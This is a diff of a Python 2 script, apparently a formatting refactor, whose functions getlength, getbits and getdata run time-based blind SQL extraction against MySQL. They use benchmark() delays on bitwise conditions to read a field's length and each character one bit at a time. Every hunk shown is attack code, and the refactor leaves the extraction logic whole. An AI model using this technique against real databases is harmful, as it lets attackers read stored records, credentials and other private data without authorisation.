@@ -27,7 +27,7 @@ def getlength(field,table,where):
 	mintime = measure("select curdate()")
 	
 	for bitpos in bits8:
-		sql = "select if(length(%s) & %d,benchmark(%d,md5('cc')),0) from %s where %s;" % (field,bitpos,iters,table,where)
+		sql = "select if(length({0!s}) & {1:d},benchmark({2:d},md5('cc')),0) from {3!s} where {4!s};".format(field, bitpos, iters, table, where)
 		_time = measure(sql)
 
 		bit = int((_time/mintime) > sensitivity)
@@ -41,7 +41,7 @@ def getbits(pos,field,table,where):
 	mintime = measure("select curdate()")
 	
 	for bitpos in bits8:
-		sql = "select if(ord(substring(%s,%d,1)) & %d,benchmark(%d,md5('cc')),0) from %s where %s;" % (field,pos,bitpos,iters,table,where) 
+		sql = "select if(ord(substring({0!s},{1:d},1)) & {2:d},benchmark({3:d},md5('cc')),0) from {4!s} where {5!s};".format(field, pos, bitpos, iters, table, where) 
 		_time = measure(sql)
 		
 		bit = int((_time/mintime) > sensitivity)
@@ -56,7 +56,7 @@ def getdata(field,table,where):
 	print "length: ",length
 	for i in range(1,length):
 		c = chr(getbits(i,field,table,where))
-		print "CHAR: '%s'" % c
+		print "CHAR: '{0!s}'".format(c)
 		tmp += c
 	return tmp
 
